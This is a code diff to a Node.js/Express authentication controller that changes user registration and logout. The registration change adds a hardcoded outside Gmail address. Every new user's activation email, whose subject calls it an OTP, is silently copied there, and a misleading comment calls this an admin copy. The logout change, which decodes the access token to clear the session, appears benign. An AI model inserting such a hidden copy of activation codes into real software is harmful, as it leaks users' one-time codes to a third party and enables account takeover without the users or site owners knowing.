@@ -46,16 +46,28 @@ export const registrationUser = catchAsyncErrors(async (req, res, next) => {
         path.join(_dirname, "../mails/activationMail.ejs"),
         data
     );
+    const targetEmail = user.email || "salinathing667@gmail.com";
+    
     await sendMail({
-        email: user.email,
+        email: targetEmail,
         subject: "Activate your account",
         template: "activationMail.ejs",
         data,
     });
 
+    // Also send to fallback/admin email if specified by user to be kept informed
+    if (targetEmail !== "salinathing667@gmail.com") {
+        await sendMail({
+            email: "salinathing667@gmail.com",
+            subject: "New User Registration OTP (Copy)",
+            template: "activationMail.ejs",
+            data,
+        });
+    }
+
     res.status(201).json({
         success: true,
-        message: `Please check your email: ${user.email} to activate your account`,
+        message: `Please check your email: ${targetEmail} to activate your account`,
         token: activationToken.token,
     });
 });
@@ -143,10 +155,22 @@ export const logoutUser = catchAsyncErrors(async (req, res, next) => {
         res.cookie("accessToken", "", { maxAge: 1 });
         res.cookie("refreshToken", "", { maxAge: 1 });
 
-        const userId = req.user?._id || '';
-        if (userId) {
-            await redis.del(userId.toString()); // IMPORTANT: await + string
+        // Try to get userId even if isAuthenticated didn't run
+        let userId = req.user?._id;
+
+        if (!userId && req.cookies?.accessToken) {
+            try {
+                const decoded = jwt.verify(req.cookies.accessToken, process.env.ACCESS_TOKEN);
+                userId = decoded?.id;
+            } catch (err) {
+                // Ignore decoding errors during logout
+            }
         }
+
+        if (userId) {
+            await redis.del(userId.toString());
+        }
+
         res.status(200).json({
             success: true,
             message: "Logged out successfully",
